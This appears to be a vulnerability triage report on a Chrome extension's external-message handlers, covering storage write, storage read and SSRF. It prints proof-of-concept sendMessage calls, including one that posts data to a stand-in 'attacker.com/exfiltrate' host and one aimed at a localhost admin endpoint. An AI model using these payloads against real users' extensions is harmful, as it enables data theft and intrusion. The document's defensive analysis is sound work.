# CoCo Analysis: adcfjjelnhpmgldpodkdknapjlcdcnce

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (multiple distinct vulnerabilities)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/adcfjjelnhpmgldpodkdknapjlcdcnce/opgen_generated_files/bg.js
Line 992: `var v = request.v;`

**Code:**

```javascript
// Background script - chrome.runtime.onMessageExternal listener (lines 965-1013)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse){
  if (request.action == "setValue"){
    var k = request.k;  // ← attacker-controlled key
    var v = request.v;  // ← attacker-controlled value

    chrome.storage.local.set({[k]: v});  // Storage write sink
    sendResponse(v);
  }
  // ... other handlers
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain (google.com, live.com, office.com, office365.com, chromium.org)
// Per methodology: IGNORE externally_connectable restrictions - if onMessageExternal exists, assume exploitable
chrome.runtime.sendMessage('adcfjjelnhpmgldpodkdknapjlcdcnce', {
  action: 'setValue',
  k: 'malicious_key',
  v: 'malicious_value'
});
```

**Impact:** Storage poisoning - attacker from whitelisted domains can write arbitrary data to extension's local storage, poisoning extension state.

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/adcfjjelnhpmgldpodkdknapjlcdcnce/opgen_generated_files/bg.js
Line 752: (CoCo framework code - actual code at lines 996-1001)

**Code:**

```javascript
// Background script - getValue handler (lines 996-1001)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse){
  // ... other handlers
  else if (request.action == "getValue"){
    var k = request.k;  // ← attacker-controlled key

    chrome.storage.local.get(k, (result) => {
      sendResponse(result[k]);  // ← sends storage data back to attacker
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain
chrome.runtime.sendMessage('adcfjjelnhpmgldpodkdknapjlcdcnce', {
  action: 'getValue',
  k: 'sensitive_key'
}, function(response) {
  console.log('Stolen data:', response);  // Attacker receives storage data
});
```

**Impact:** Information disclosure - attacker can read arbitrary keys from extension's local storage, potentially accessing sensitive user data, tokens, or configuration.

---

## Sink 3: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/adcfjjelnhpmgldpodkdknapjlcdcnce/opgen_generated_files/bg.js
Line 1004: `fetch(request.url, {`

**Code:**

```javascript
// Background script - ajax handler (lines 1002-1012)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse){
  // ... other handlers
  else if (request.action == "ajax"){
    fetch(request.url, {  // ← attacker-controlled URL
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: request.body  // ← attacker-controlled body
    })
    .then(r => r.json().then(data => ({status: r.status, data: data})))
    .then(obj => sendResponse(obj))  // ← sends response back to attacker
    .catch(obj => sendResponse(obj));
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain - SSRF to internal network
chrome.runtime.sendMessage('adcfjjelnhpmgldpodkdknapjlcdcnce', {
  action: 'ajax',
  url: 'http://localhost:8080/admin/delete',
  body: JSON.stringify({user: 'admin'})
}, function(response) {
  console.log('SSRF response:', response);
});

// Or exfiltrate data to attacker server
chrome.runtime.sendMessage('adcfjjelnhpmgldpodkdknapjlcdcnce', {
  action: 'ajax',
  url: 'https://attacker.com/exfiltrate',
  body: JSON.stringify({stolen: 'data'})
});
```

**Impact:** Privileged SSRF - attacker can make arbitrary POST requests from extension's privileged context to any URL (internal networks, localhost, cross-origin), bypassing CORS and accessing resources inaccessible to normal web pages. Response data is sent back to attacker.

---

## Sink 4: fetch_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/adcfjjelnhpmgldpodkdknapjlcdcnce/opgen_generated_files/bg.js
Line 265: `var responseText = 'data_from_fetch';` (CoCo framework code)

This sink is covered by Sink 3 analysis above - the fetch response flows back to the attacker via sendResponse in the ajax handler.

**Classification:** TRUE POSITIVE (duplicate of Sink 3)

---

## Complete Attack Chain

The extension has a complete storage exploitation chain:

1. **Storage Write**: Attacker poisons storage via `setValue` action (Sink 1)
2. **Storage Read**: Attacker retrieves poisoned data via `getValue` action (Sink 2)
3. **SSRF**: Attacker makes privileged cross-origin requests via `ajax` action (Sink 3)

All vulnerabilities are exploitable from whitelisted domains (google.com, live.com, office.com, office365.com, chromium.org) via chrome.runtime.onMessageExternal. Per the methodology, externally_connectable restrictions are ignored - the presence of onMessageExternal makes this exploitable.
